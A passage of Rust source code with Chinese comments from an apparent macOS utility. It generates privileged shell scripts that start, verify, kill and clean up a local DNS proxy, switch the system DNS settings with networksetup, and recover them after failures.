/// 生成 `enable_dns_mode` 执行的 sh 脚本。
///
/// 暴露为 `pub(crate)` 主要是给测试调用 —— 见 `test_*_pid_file_content*` 和
/// `test_*_safety_layers*`。不要在这两个测试里再 format! 一份独立脚本。
///
/// 脚本语义（**fix F2/F4, PR #156 review**）：
///   1. **path 安全**：proxy / pid / log / interface 全部走
///      `shell_single_quote` 注入，避免带空格路径截断
///   2. **transactional**：注册 EXIT trap，在 `networksetup` 成功前
///      任意失败 → 杀掉 disowned proxy + 删 PID 文件，保证不留下
///      占着 53 端口的 orphan。`networksetup` 成功后 `trap - EXIT` 解除，
///      proxy + PID 文件保留供 `disable_dns_mode` 用
///   3. **Layer 1 [ -x ]**：和 Rust pre-check 重复一次，提权后是另一个
///      uid 上下文，pre-check 的 metadata 不能复用
///   4. **Layer 2 kill -0**：proxy 启动后 1s 探测存活，覆盖
///      bind 失败 / 早期 panic / 立即退出 等 set -e + & 吞错的场景
pub(crate) fn build_enable_script(inputs: &EnableScriptInputs) -> String {
    let proxy = shell_single_quote(&inputs.proxy_path.to_string_lossy());
    let pid_file = shell_single_quote(&inputs.pid_file.to_string_lossy());
    let log = shell_single_quote(&inputs.log_path.to_string_lossy());
    let interface = shell_single_quote(inputs.interface);

    format!(
        r#"#!/bin/sh
set -e

PROXY={proxy}
PID_FILE={pid_file}
LOG_FILE={log}
IFACE={interface}

PROXY_PID=""

# **fix（F4, PR #156 review）**：EXIT trap 在 networksetup 成功之前
# 把 disowned root proxy 杀掉 + 删 PID 文件。否则 bind 成功 + networksetup
# 失败会让 53 端口被占着、找不到 PID 来 kill，恢复不到原状。
cleanup() {{
    rc=$?
    if [ -n "$PROXY_PID" ] && kill -0 "$PROXY_PID" 2>/dev/null; then
        kill "$PROXY_PID" 2>/dev/null || true
    fi
    rm -f "$PID_FILE"
    exit "$rc"
}}
trap cleanup EXIT

# ---- fix A: inline sudo-level orphan cleanup (already-elevated shell) ----
# **fix (issue #152 hardening, Step 2)**：避免盲扫 `pgrep -x mhost-dns-proxy`。
# 上一轮的 expected proxy 正在 self-restore（disable 中途发起的
# restore_dns_and_exit 调用 networksetup 还没返回）时，如果 disable→re-enable
# 在 ~1s 内发生，broad pgrep 会 TERM 掉还在跑 networksetup 的 proxy →
# 系统 DNS 卡在 127.0.0.1。所以这里改成 PID-targeted kill：只对 pid_file
# 里记录的 expected PID 做 TERM，且先用 `ps -o comm=` 精确匹配 basename
# 防 PID 重用误杀（与 Rust 端 `cleanup_stale_proxy` 同样的语义）。
# 只有 pid_file 缺失或陈旧（>30s）才退回 broad pgrep 兜底（针对真正的孤儿，
# 不是 expected proxy）。
if [ -f "{pid_file}" ]; then
    pid=$(awk '{{print $1}}' "{pid_file}")
    expected=$(awk '{{print $2}}' "{pid_file}")
    expected_bn=$(basename "$expected" 2>/dev/null || echo "$expected")
    if [ -n "$pid" ] && [ -n "$expected_bn" ]; then
        current=$(ps -p "$pid" -o comm= 2>/dev/null | xargs -I{{}} basename {{}} 2>/dev/null || echo "")
        if [ "$current" = "$expected_bn" ]; then
            kill -TERM "$pid" 2>/dev/null || true
        fi
    fi
fi
sleep 1
# Broad sweep 只在 pid_file 缺失或陈旧（>30s）时才跑 —— 保护 expected proxy
# 不被「快速 re-enable」误杀，但真正的孤儿（pid_file 已经被自己的 cleanup
# 清掉、或者 30s 前就死掉的）会被清理。
pid_file_age=999
if [ -f "{pid_file}" ]; then
    pid_file_mtime=$(stat -f %m "{pid_file}" 2>/dev/null || echo "0")
    now=$(date +%s)
    pid_file_age=$((now - pid_file_mtime))
fi
if [ "$pid_file_age" -gt 30 ]; then
    for pid in $(pgrep -x mhost-dns-proxy); do
        kill -KILL "$pid" 2>/dev/null || true
    done
fi

# Layer 1：显式可执行校验（提权后是另一 uid 上下文，再防一层）
if [ ! -x "$PROXY" ]; then
    echo "mhost-dns-proxy not executable at $PROXY" >&2
    exit 127
fi

# 后台启动 proxy，stdout/stderr 重定向到 log 文件
"$PROXY" --listen 53 --target {dns_port} >"$LOG_FILE" 2>&1 &
PROXY_PID=$!
echo "$PROXY_PID $PROXY" > "$PID_FILE"
disown

# Layer 2：等 1 秒确认 proxy 还活着。`set -e + &` 不监测 async list
# 退出码，必须靠 `kill -0` 探测。proxy 启动失败 / bind 53 失败 /
# 早期 panic 都会被这里捕获。
sleep 1
if ! kill -0 "$PROXY_PID" 2>/dev/null; then
    echo "mhost-dns-proxy (pid $PROXY_PID) exited within 1s of launch; log:" >&2
    cat "$LOG_FILE" >&2 || true
    exit 1
fi

# 仅在 proxy 真 alive + 可执行 + bind 后才把系统 DNS 切到 127.0.0.1
networksetup -setdnsservers "$IFACE" 127.0.0.1

# 成功：解除 trap，proxy + PID 文件保留供 disable 路径使用
trap - EXIT
"#,
        proxy = proxy,
        dns_port = inputs.dns_port,
        pid_file = pid_file,
        log = log,
        interface = interface,
    )
}

/// `build_disable_script` 的输入参数。镜像 `EnableScriptInputs` 的风格。
///
/// **fix（issue #163 re-fix of PR #164）**：`proxy_pid` 在 5s 超时分支为
/// Some；proxy-not-running / 首次 disable 路径为 None。
/// `expected_basename`：PID 文件里记录的 binary path 的 basename，用于
/// `#81` 精确匹配 comm 校验（防 PID 重用误杀）。老格式 PID 文件（仅 PID
/// 没 binary 路径）传 None，跳过 comm 校验。
pub(crate) struct DisableScriptInputs<'a> {
    pub interface: &'a str,
    /// `"Empty"` 或空格分隔的 IP 列表，由 `osascript_restore` 从
    /// `OriginalDns::restore_argv()` 计算后传入。
    pub target: String,
    pub proxy_pid: Option<u32>,
    pub expected_basename: Option<String>,
}

/// 构造 disable 时 `run_with_privileges` 跑的 sh 脚本。
///
/// **fix（issue #163 re-fix of PR #164）**：当 `proxy_pid` 为 Some，脚本
/// 在 `networksetup` 之前先做 `#81` comm 校验 + sudo-escalated `kill -9`：
///
/// ```sh
/// EXPECTED=<basename>
/// ACTUAL=$(ps -p <pid> -o comm= 2>/dev/null | xargs -I{} basename {} 2>/dev/null)
/// if [ "$ACTUAL" = "$EXPECTED" ]; then kill -9 <pid> 2>/dev/null; fi
/// true
/// networksetup -setdnsservers <iface> <target>
/// ```
///
/// 整个 kill 在 `osascript ... with administrator privileges` 提权上下文
/// 里执行，能干掉 root 跑的 proxy（用户态 `libc::kill` 因 EPERM 静默失
/// 败 —— 这就是 PR #164 没工作的根因）。`2>/dev/null` + `if` + 尾部 `true`
/// 三重保险：ESRCH / EPERM / comm 不匹配都不会让脚本非零退出，
/// `networksetup` 仍能跑。
pub(crate) fn build_disable_script(inputs: &DisableScriptInputs<'_>) -> String {
    // **fix (PR #164 review concern #3)**：`expected` 已经过
    // `read_proxy_expected_basename` 的 basename charset 校验；这里再用
    // `shell_single_quote` 包一层是防御深度 —— 即使上游绕过校验，shell
    // 也不会执行注入。`target` 来自 `OriginalDns::restore_argv()`（"Empty"
    // 或空格分隔的 IP 列表），来自用户原始 DNS 配置，统一加单引号保证
    // 不会被 word splitting 截断。`interface` 已经过 `validate_interface_name`
    // 校验，再加单引号是防御深度（macOS 接口名可含空格如
    // "USB 10/100/1000 LAN"）。
    let expected_q = inputs
        .expected_basename
        .as_deref()
        .map(shell_single_quote)
        .unwrap_or_default();
    let target_q = shell_single_quote(&inputs.target);
    let iface_q = shell_single_quote(inputs.interface);
    let kill_block = match (inputs.proxy_pid, inputs.expected_basename.as_deref()) {
        (Some(pid), Some(_expected)) => format!(
            "EXPECTED={expected_q}\n\
             ACTUAL=$(ps -p {pid_q} -o comm= 2>/dev/null | xargs -I{{}} basename {{}} 2>/dev/null)\n\
             if [ \"$ACTUAL\" = \"$EXPECTED\" ]; then kill -9 {pid} 2>/dev/null; fi\n\
             true\n",
            pid_q = shell_single_quote(&pid.to_string()),
        ),
        (Some(pid), None) => format!(
            // **fix (PR #164 review concern #4)**：老格式 PID 文件
            // （只 PID，没 binary 路径）→ 跳过 comm 校验。保留 kill 路径
            // 以兼容从老版本升级的用户，但往 stderr 打 WARNING 让 sudo
            // 操作可见可审计（替代之前完全静默的 SIGKILL）。
            "echo \"WARNING: skipping #81 comm check for legacy PID file {pid}\" >&2\n\
             kill -9 {pid} 2>/dev/null\n\
             true\n"
        ),
        (None, _) => String::new(),
    };
    format!(
        "{kill_block}networksetup -setdnsservers {iface_q} {target_q}",
        kill_block = kill_block,
        iface_q = iface_q,
        target_q = target_q,
    )
}

/// 原子写入文件，mode 0o600（owner only）。
///
/// 流程：写 `<path>.tmp`（mode 0o600）→ sync → rename 到目标。
/// POSIX rename 是原子的，读者要么看到旧 inode（旧内容），要么看到新
/// inode（新内容），永远看不到中间空态。
pub(crate) fn write_atomic_0600(path: &Path, content: &[u8]) -> std::io::Result<()> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;
    let parent = path.parent().unwrap_or_else(|| Path::new("."));
    // tmp 文件放在同一目录下，确保 rename 在同一 filesystem 是原子的
    let file_name = path
        .file_name()
        .and_then(|s| s.to_str())
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::InvalidInput, "invalid path"))?;
    let tmp_path = parent.join(format!("{}.tmp", file_name));
    {
        let mut opts = std::fs::OpenOptions::new();
        opts.write(true).create(true).truncate(true).mode(0o600);
        let mut f = opts.open(&tmp_path)?;
        f.write_all(content)?;
        f.sync_all()?;
    }
    std::fs::rename(&tmp_path, path)
}

/// 把 signal 文件写入指定内容，原子 + sync，mode 0o600。
///
/// **fix（B2 review）**：用「写 tmp + atomic rename」避免 truncate → write_all
/// 之间的竞态窗口。旧实现用 `OpenOptions::create().truncate()`，open 成功的
/// 那一瞬文件就被清空；如果 proxy 恰好在 open 和 write_all 之间读
/// `check_shutdown_signal`，会读到空字符串误触发 shutdown（之前 receiver
/// 端把「非 running」都当 shutdown）。
pub(crate) fn write_signal_file(path: &Path, content: &str) -> std::io::Result<()> {
    write_atomic_0600(path, content.as_bytes())
}

/// 在 macOS 上禁用 DNS 模式：
///   1. 写 "shutdown" 到 signal 文件（用户态，不需要 root）
///   2. proxy 轮询检测到，**自己以 root 身份**调 networksetup 恢复
///      DNS，然后退出
///   3. 等 proxy 退出（最多 5s）
///
/// **fix（proxy self-cleanup）**：之前用 osascript 弹 sudo 框让 mhost
/// 在 macOS 上禁用 DNS 模式：
///   1. 写 "shutdown" 到 signal 文件（用户态，不需要 root）
///   2. proxy 轮询检测到，**自己以 root 身份**调 networksetup 恢复
///      DNS，然后退出
///   3. 等 proxy 退出（最多 5s）
///   4. **interactive=true 且 proxy 未在 5s 内完成恢复**（timeout 或
///      proxy 已经不存在）：以管理员身份自己调
///      `networksetup -setdnsservers <iface> <original|Empty>` 兜底，
///      匹配 enable 路径的 sudo 行为。
///
/// **fix（proxy self-cleanup）**：disable 不再默认弹 sudo；先让 proxy
/// 自管，proxy 真不行时再让 mhost 用户态走 osascript。
///
/// **fix（bug 2，DNS 恢复兜底）**：
/// - 调用一开始就写恢复标记 `disable_recovery_marker_file()`，**先于**
///   任何 proxy 交互。如果后续没成功恢复（proxy timeout / 死了 /
///   interactive 路径的 osascript 也失败），下次启动时 `try_recover_dns`
///   看到标记会调 `force_dns_restore_if_needed` 强退。
/// - marker **只在 DNS 确实恢复成功**时被删除；任何恢复失败的分支都
///   保留 marker + 返回 Err。
///
/// **fix（disable-time sudo fallback，interactive）**：
/// - interactive=true（UI 调用）：proxy 没在 5s 内恢复、或 proxy 已死，
///   都用 `run_with_privileges` 走 `networksetup -setdnsservers` 兜底，
///   让用户当场看到 sudo 框 + DNS 恢复成功。`servers` 为空时传 `Empty`。
/// - interactive=false（退出清理）：**不弹 sudo 框**（用户可能不在场），
///   保留 marker + 返回 Err，让下次启动 try_recover_dns 走
///   `force_dns_restore_if_needed`。
///
/// **fix（issue #163, disable-time stuck proxy SIGKILL, re-fix of PR #164）**：
/// - PR #164 用用户态 `libc::kill(pid, SIGKILL)` 强退 proxy，但 **proxy
///   以 root 跑、mhost 是用户态**，user → root 的 `kill(pid, SIGKILL)`
///   静默返回 EPERM，proxy 继续占 53 端口，下一次 enable 仍拿到
///   `EADDRINUSE (os error 48)`。同样的，`kill(pid, 0)` 从用户态查 root
///   进程也 EPERM，被现有代码误判为「进程已死」（`alive = false`），直接
///   跳过 5s 超时分支，根本走不到 PR #164 的 SIGKILL。
/// - **正确做法**：把 `kill -9 <pid>`（带 `#81` comm 校验防 PID 重用）
///   拼进 `build_disable_script` 生成的 sh 脚本，让 kill 在 `osascript ...
///   with administrator privileges` 的 sudo 提权上下文里以 root 执行。
///   跟 `networksetup` 共用同一个 sudo 弹窗，零额外授权。
/// - 用户态 `kill_proxy_via_pid_file` 保留为 fast-path / 防御层（PR #164
///   的契约，对 root proxy 会 EPERM 失败但 cheap + harmless；未来若 proxy
///   改回用户态跑仍能起作用）。
/// - 两个分支都传 PID 进 `osascript_restore`：5s 超时分支传 `Some(proxy_pid)`
///   必杀；proxy-not-running 分支传 `proxy_pid_at_start`（即使 kill(pid,0)
///   因 EPERM 让我们误判为「死」，sudo 提权的 kill 仍能把 root proxy 干掉）。
/// - kill 失败（PID reuse, `#81` comm 不匹配）只 log warning，不影响 DNS
///   恢复路径；marker 兜底逻辑保持不变。修复后所有四条退出路径（UI Disable
///   / Tray Quit / Cmd-Q / SIGINT/SIGTERM）都不再泄漏 53 端口。
///
/// **kill-then-restore failure chain**（**fix (PR #164 review nit #10)**）：
/// 如果 sudo 脚本里的 `kill -9 <pid>` 成功但
/// `networksetup -setdnsservers <iface> <target>` 失败（典型场景：mid-call
/// 时接口消失 / 用户在 System Settings 抢锁），`osascript_restore` 返回 Err，
/// **recovery marker 保留**（上面"marker 兜底逻辑保持不变"），下一次
/// 启动 mhost 时 `force_dns_restore_if_needed` 看到标记会写 `Empty`
/// （DHCP）。这是**故意的** —— kill-then-restore 这一对是 best-effort，
/// DHCP 是安全 fallback。专门文档化是为 traceability：后续 reviewer 看
/// 到"marker 保留 + 上次 Disable 返回 Err"不会以为是 race / bug。
///
/// 注：参数 `servers` 保留 API 兼容：proxy 用自己的 original.txt 恢复，
/// 但 interactive 分支用 `servers` 决定要恢复成什么 IP（proxy 不在的
/// 兜底场景）。
pub fn disable_dns_mode(original: &OriginalDns, interactive: bool) -> Result<(), PlatformError> {
    // 0. 写恢复标记（用户态、不需 root）。如果本次 disable 任何分支没
    //    成功恢复 DNS，marker 会保留 → 下次启动 try_recover_dns 看到标记
    //    会调 force_dns_restore_if_needed 强退。
    ensure_runtime_dir().map_err(|e| {
        PlatformError::RestoreDns(format!("create runtime dir for recovery marker: {}", e))
    })?;
    write_recovery_marker()
        .map_err(|e| PlatformError::RestoreDns(format!("write recovery marker: {}", e)))?;

    // **fix（issue #163 re-fix）**：把 PID 提到外层 scope，让两个
    // osascript_restore 调用点（5s 超时 + proxy-not-running）都能拿到。
    // proxy-not-running 路径也传 Some(pid) 而不是 None —— 即使
    // `kill(pid, 0)` 返回 EPERM 让我们误判为「死」，sudo 提权的 kill
    // 仍能把 root proxy 干掉。
    let proxy_pid_at_start: Option<u32> = read_proxy_pid();
    let expected_basename_at_start: Option<String> = read_proxy_expected_basename();

    // 内部 helper：interactive 分支用 osascript 兜底恢复系统 DNS。
    //
    // **fix（issue #163 re-fix of PR #164）**：当 `proxy_pid` 为
    // `Some(pid)`，脚本会先做 `#81` comm 校验 + sudo-escalated `kill -9`，
    // 再 `networksetup -setdnsservers`。kill 在
    // `osascript ... with administrator privileges` 提权上下文里以 root
    // 执行 —— 干掉 root 跑的 proxy（用户态 `libc::kill` 因 EPERM 静默
    // 失败，这就是 PR #164 没工作的根因）。整个操作在同一个 sudo 弹窗
    // 内完成，零额外授权。
    //
    // 只负责调 networksetup + 可选 kill；marker / 临时文件的清理由调用方
    // 根据成功 / 失败统一处理。
    fn osascript_restore(
        original: &OriginalDns,
        proxy_pid: Option<u32>,
        expected_basename: Option<&str>,
    ) -> Result<(), PlatformError> {
        let interface = get_active_network_interface()?;
        validate_interface_name(&interface)?;
        let argv = original.restore_argv();
        let target = if argv.len() == 1 && argv[0] == "Empty" {
            "Empty".to_string()
        } else {
            argv.join(" ")
        };
        let script_body = build_disable_script(&DisableScriptInputs {
            interface: &interface,
            target,
            proxy_pid,
            expected_basename: expected_basename.map(str::to_string),
        });
        let out = run_with_privileges(&script_body).map_err(|e| {
            PlatformError::RestoreDns(format!("invoke osascript for disable-time restore: {}", e))
        })?;
        if !out.status.success() {
            let stderr = String::from_utf8_lossy(&out.stderr);
            return Err(PlatformError::RestoreDns(format!(
                "disable-time restore failed: {}",
                stderr
            )));
        }
        Ok(())
    }

    // 1. 检查 proxy 是否真的在跑 —— 如果在跑，写 signal 让它自管；
    //    如果不在（已崩溃/没启过），跳到分支 2。
    if let Some(proxy_pid) = proxy_pid_at_start {
        // proxy 存在（PID 文件可读）。检查进程是否还活。
        let alive = unsafe { libc::kill(proxy_pid as libc::pid_t, 0) == 0 };
        if alive {
            // 写 "shutdown" signal（用户态，不需要 root）
            write_signal_file(&shutdown_signal_file(), "shutdown")
                .map_err(|e| PlatformError::RestoreDns(format!("write shutdown signal: {}", e)))?;
            eprintln!("[mHost] dns mode disable: signal sent to proxy, waiting for exit");

            // 等 proxy 退出：循环检查 PID 是否还活，最多 5 秒
            let deadline = std::time::Instant::now()
                + std::time::Duration::from_secs(PROXY_SHUTDOWN_TIMEOUT_SECS);
            while std::time::Instant::now() < deadline {
                std::thread::sleep(std::time::Duration::from_millis(100));
                if unsafe { libc::kill(proxy_pid as libc::pid_t, 0) != 0 } {
                    // proxy 已退出。**fix (issue #152 hardening, Step 3)**：
                    // 不要无条件认为成功 —— proxy 退出前 networksetup 失败
                    // 也算「正常退出」。post-restore 验证一次：当前 DNS 还有
                    // loopback 就按 5s 超时的兜底路径升级（interactive 弹 sudo，
                    // !interactive / 兜底失败 → 保留 marker）。
                    match verify_dns_restored_against_loopback() {
                        Ok(true) => {
                            // 真的恢复了。清文件 + marker。
                            let _ = std::fs::remove_file(proxy_pid_file());
                            let _ = std::fs::remove_file(original_dns_file());
                            // signal 文件由 proxy 自己清理（restore_dns_and_exit）
                            let _ = std::fs::remove_file(disable_recovery_marker_file());
                            return Ok(());
                        }
                        Ok(false) => {
                            // proxy 死了但 DNS 还卡在 loopback
                            eprintln!(
                                "[mHost] dns mode disable: proxy exited but system DNS \
                                 still points at loopback; escalating to sudo fallback"
                            );
                            let _ = std::fs::remove_file(proxy_pid_file());
                            let _ = std::fs::remove_file(original_dns_file());
                            let _ = std::fs::remove_file(shutdown_signal_file());
                            // marker 必须保留给下次启动 try_recover_dns
                            if interactive
                                && osascript_restore(
                                    original,
                                    proxy_pid_at_start,
                                    expected_basename_at_start.as_deref(),
                                )
                                .is_ok()
                            {
                                let _ = std::fs::remove_file(disable_recovery_marker_file());
                                return Ok(());
                            }
                            return Err(PlatformError::RestoreDns(format!(
                                "proxy exited but system DNS still points at loopback; \
                                 recovery marker left at {}",
                                disable_recovery_marker_file().display()
                            )));
                        }
                        Err(e) => {
                            // 验证本身失败（networksetup 也卡了），按失败处理
                            eprintln!(
                                "[mHost] dns mode disable: post-restore verify failed ({}); \
                                 preserving recovery marker",
                                e
                            );
                            let _ = std::fs::remove_file(proxy_pid_file());
                            let _ = std::fs::remove_file(original_dns_file());
                            let _ = std::fs::remove_file(shutdown_signal_file());
                            // marker 必须保留给下次启动 try_recover_dns
                            if interactive
                                && osascript_restore(
                                    original,
                                    proxy_pid_at_start,
                                    expected_basename_at_start.as_deref(),
                                )
                                .is_ok()
                            {
                                let _ = std::fs::remove_file(disable_recovery_marker_file());
                                return Ok(());
                            }
                            return Err(PlatformError::RestoreDns(format!(
                                "post-restore verify failed: {}; recovery marker left at {}",
                                e,
                                disable_recovery_marker_file().display()
                            )));
                        }
                    }
                }
            }
            // 5s 超时：proxy 还活着但没自管恢复
            eprintln!(
                "[mHost] dns mode disable: proxy did not exit within {}s",
                PROXY_SHUTDOWN_TIMEOUT_SECS
            );
            if interactive {
                // ISSUE #163：5s 超时后 proxy 还活着 —— 它还占着
                // 127.0.0.1:53/UDP。
                //
                // **fix（issue #163 re-fix of PR #164）**：PR #164 用用户
                // 态 `libc::kill(pid, SIGKILL)` 强退，但 proxy 以 root
                // 跑 → user → root 的 kill 静默 EPERM，proxy 不死。
                //
                // 现在的层次：
                // 1. user-space `kill_proxy_via_pid_file` 作为 fast-path
                //    / defense-in-depth（root proxy 时 EPERM 失败但 cheap
                //    + harmless；未来若 proxy 改回用户态跑仍能起作用）
                // 2. **主杀**：`osascript_restore` 的 sudo 提权脚本里 kill，
                //    跟 networksetup 共用一次 sudo 弹窗（见 build_disable_script）
                match kill_proxy_via_pid_file(&proxy_pid_file()) {
                    KillOutcome::Killed => {
                        eprintln!(
                            "[mHost] dns mode disable: killed via user-space fast-path (issue #163)"
                        );
                    }
                    KillOutcome::PidReusedOrMismatch => {
                        eprintln!(
                            "[mHost] dns mode disable: user-space kill skipped (likely EPERM on root proxy); \
                             relying on sudo kill"
                        );
                    }
                    KillOutcome::PidDeadAlready | KillOutcome::FileMissing => {
                        // polling 已检测 proxy 退出但 PID 文件没清（race）；无事可做
                    }
                }

                // UI 路径：弹 sudo 让用户当场恢复（脚本里同时 kill proxy + 恢复 DNS）
                if osascript_restore(
                    original,
                    Some(proxy_pid),
                    expected_basename_at_start.as_deref(),
                )
                .is_ok()
                {
                    // 兜底成功：清全部文件 + marker
                    let _ = std::fs::remove_file(proxy_pid_file());
                    let _ = std::fs::remove_file(original_dns_file());
                    let _ = std::fs::remove_file(shutdown_signal_file());
                    let _ = std::fs::remove_file(disable_recovery_marker_file());
                    return Ok(());
                }
                // 兜底也失败：保留 marker 给下次启动 try_recover_dns
            }
            // 非 interactive 或 interactive 兜底失败：保留 marker
            return Err(PlatformError::RestoreDns(format!(
                "dns proxy did not exit within {}s; recovery marker left at {}",
                PROXY_SHUTDOWN_TIMEOUT_SECS,
                disable_recovery_marker_file().display()
            )));
        }
        // PID 文件存在但进程死了：清理 PID 文件（marker 保留到下面）
        let _ = std::fs::remove_file(proxy_pid_file());
    }

    // 2. proxy 不在（早死 / 从没启过 / PID 死后到这里）
    //
    // **fix（issue #163 re-fix）**：传 `Some(proxy_pid_at_start)` 而不是
    // `None` —— 即使 `kill(pid, 0)` 因 EPERM 让我们误判为「死」，sudo
    // 提权的 kill 仍能把潜在的 root proxy 干掉。
    if interactive {
        // UI 路径：proxy 都没在，肯定没人恢复 DNS，必须 sudo 兜底
        if osascript_restore(
            original,
            proxy_pid_at_start,
            expected_basename_at_start.as_deref(),
        )
        .is_ok()
        {
            let _ = std::fs::remove_file(original_dns_file());
            let _ = std::fs::remove_file(shutdown_signal_file());
            let _ = std::fs::remove_file(disable_recovery_marker_file());
            return Ok(());
        }
        // 兜底失败：保留 marker 给下次启动 try_recover_dns
        return Err(PlatformError::RestoreDns(format!(
            "proxy not running and osascript restore failed; recovery marker left at {}",
            disable_recovery_marker_file().display()
        )));
    }
    // 非 interactive（exit 清理）：proxy 没恢复 DNS → marker 必须保留，
    // 下次启动 try_recover_dns 看到会调 force_dns_restore_if_needed。
    // 清理 PID / original / signal 文件（PID 已经在上面清掉了）。
    let _ = std::fs::remove_file(original_dns_file());
    let _ = std::fs::remove_file(shutdown_signal_file());
    eprintln!(
        "[mHost] dns mode disable (exit cleanup): proxy not running; \
         restore target was {:?}; recovery marker preserved for next launch.",
        original.restore_argv()
    );
    Err(PlatformError::RestoreDns(format!(
        "proxy not running; recovery marker left at {} for next-launch force restore",
        disable_recovery_marker_file().display()
    )))
}

/// 写恢复标记文件（"pending"，0o600，sync 落盘）。
///
/// 用途：disable 启动时先于任何 proxy 交互写下；正常路径会删掉；
/// 5s 超时 / 进程被 kill 等异常路径会保留 → 下次启动 `try_recover_dns`
/// 看到标记，调 `force_dns_restore_if_needed` 兜底。
fn write_recovery_marker() -> std::io::Result<()> {
    let marker = disable_recovery_marker_file();
    write_atomic_0600(&marker, b"pending")
}

/// 上次退出没成功恢复时，下一次启动的兜底：以 admin 身份调用
/// `networksetup -setdnsservers <iface> Empty`（DHCP），删 marker。
/// 仅在「确实出现恢复失败」时被调用 —— osascript sudo 弹窗
/// 只在异常路径出现，正常退出零成本。
pub fn force_dns_restore_if_needed() -> Result<(), PlatformError> {
    let interface = get_active_network_interface()?;
    validate_interface_name(&interface)?;

    let script_body = format!(
        "networksetup -setdnsservers {iface} Empty",
        iface = interface
    );
    let out = run_with_privileges(&script_body).map_err(|e| {
        PlatformError::RestoreDns(format!("invoke osascript for force restore: {}", e))
    })?;
    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        return Err(PlatformError::RestoreDns(format!(
            "force restore failed: {}",
            stderr
        )));
    }

    let _ = std::fs::remove_file(disable_recovery_marker_file());
    Ok(())
}

/// **fix (issue #152 hardening, Step 3)**：post-restore 验证的纯逻辑部分。
///
/// 把「servers 里是否有 loopback」抽成纯函数，便于单测覆盖各种
/// 输入组合（`networksetup_get_dns` 本身要走 `Command::new`，纯单测
/// 不能跑到）。
///
/// 返回 `true` 表示「仍有 loopback」 → caller 应当升级到兜底路径。
pub(crate) fn any_local_resolver(servers: &[String]) -> bool {
    servers.iter().any(|s| is_local_resolver(s))
}

/// **fix (issue #152 hardening, Step 3)**：post-restore 验证。
///
/// proxy self-restore 走 `networksetup -setdnsservers` 时可能因为
/// configd 抖动 / Wi-Fi handoff / TCC 缓存等原因静默失败；proxy 进程
/// 仍然正常退出（`restore_dns_and_exit` 把 `networksetup` 错误当 warning
/// 处理），mhost 端的 `kill(pid,0)!=0` 也跟着认为 disable 成功。
///
/// 验证：proxy 退出后从 networksetup 读回 DNS，如果还有任何
/// loopback（`127.0.0.1` / `::1` / unspecified），说明 proxy 自管
/// 失败 → 不要清 marker，按 5s 超时的兜底路径升级。
///
/// 返回语义：
/// - `Ok(true)`：当前 DNS 没有 loopback（安全，可清 marker）
/// - `Ok(false)`：当前 DNS 仍有 loopback（proxy 自管失败）
/// - `Err(_)`：networksetup 自己失败（按失败处理，最保守）
fn verify_dns_restored_against_loopback() -> Result<bool, PlatformError> {
    let interface = get_active_network_interface()?;
    validate_interface_name(&interface)?;
    let servers = networksetup_get_dns(&interface)?;
    Ok(!any_local_resolver(&servers))
}

/// 从 PID 文件读出 proxy 的 PID（如果可读 + 可解析）。
fn read_proxy_pid() -> Option<u32> {
    let content = std::fs::read_to_string(proxy_pid_file()).ok()?;
    content.split_whitespace().next()?.parse().ok()
}

/// 严格 basename 字符集：ASCII 字母、数字、`._-`，与合法 binary 名一致。
///
/// **fix (PR #164 review concern #3)**：`read_proxy_expected_basename` 在把
/// 字符串注入 `build_disable_script` 的 sudo 脚本（`EXPECTED='...'`）
/// 之前先用这个字符集做白名单校验。即便 `shell_single_quote` 已经
/// 防住注入，把非 basename 内容推进 disable 脚本本身也是个 bad smell
/// —— 表示 PID 文件被外部进程改坏了，应该走"无预期 basename"路径
/// （= legacy arm = stderr WARNING）而不是相信文件内容。
fn is_valid_basename_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-'
}

/// 从 PID 文件读出记录的 binary path 的 basename（#81 安全格式）。
///
/// **fix（issue #163 re-fix）**：传给 `build_disable_script` 在 sudo 提权
/// 上下文里做 comm 校验，防止 PID 重用时被误杀。返回 `None` 表示：
/// - PID 文件不存在 / 不可读
/// - PID 文件只有 PID 没有 binary path（老格式）
/// - **fix (PR #164 review concern #3)**：recorded binary path 不是合法
///   basename（含 shell metacharacter / 路径分隔符等）—— PID 文件可能
///   被外部破坏，宁可走"无预期 basename"路径也不冒险
fn read_proxy_expected_basename() -> Option<String> {
    let content = std::fs::read_to_string(proxy_pid_file()).ok()?;
    let recorded_binary = content.split_whitespace().nth(1)?;
    if recorded_binary.is_empty() {
        return None;
    }
    let file_name = std::path::Path::new(recorded_binary)
        .file_name()?
        .to_str()?;
    // 基线：必须是严格 basename 字符集（ASCII alphanumeric / . _ -）
    if !file_name.chars().all(is_valid_basename_char) {
        return None;
    }
    Some(file_name.to_string())
}

/// 清理残留的 dns-proxy 进程（应用启动时调用）。
///
/// **安全修复（#81）**：PID 文件不再仅含 PID，还含 `mhost-dns-proxy` 路径。
/// 清理时先 `kill(pid, 0)` 检查存活，再用 `ps -p` 校验进程名是 `mhost-dns-proxy`
/// 才 SIGTERM；防止误杀其他进程（PID 重用）。
///
/// **fix（systematic DNS logic review）**：之前用 `comm.trim().contains("mhost-dns-proxy")`
/// 模糊匹配，攻击者或巧合的二进制名（如 `not-mhost-dns-proxy`）会被错杀。
/// 现在从 PID 文件读出原始 binary_path，与 `ps -o comm=` 做**精确相等比较**。
///
/// **fix（issue #163, SIGKILL escalation）**：之前只 SIGTERM，proxy trap SIGTERM
/// 后会留半死状态占着 53 端口。现在调 `kill_proxy_via_pid_file`，里面有
/// SIGTERM → 150ms → SIGKILL 升级，与 disable 路径用同一份 helper，行为一致。
///
/// **fix（H1, issue #90）**：启动时也清掉老 /tmp 路径下的残留文件
/// （用户从老版本升级过来时会留有这些孤儿文件，world-readable 可能含 DNS 信息）。
///
/// **fix（issue #163 re-fix, known limitation at startup）**：
/// `kill_proxy_via_pid_file` 内部调用户态 `libc::kill`。如果 proxy 当前
/// 以 root 跑（生产场景：enable 时 osascript 提权起的），kill 静默 EPERM
/// 失败，stale proxy 不会被启动清理杀掉。**不在 startup 路径上弹 sudo 框**
/// （intrusive UX），依赖用户的下一次 Disable 点击触发 `disable_dns_mode`
/// 走 sudo 升级的 `kill -9`（见 `disable_dns_mode` 文档）。这是已知
/// trade-off；不影响功能正确性，只是清理时机推迟到下次 disable。
pub fn cleanup_stale_proxy() {
    // H1: 先清理老 /tmp 路径下的孤儿文件
    cleanup_legacy_tmp_files();

    let pid_path = proxy_pid_file();
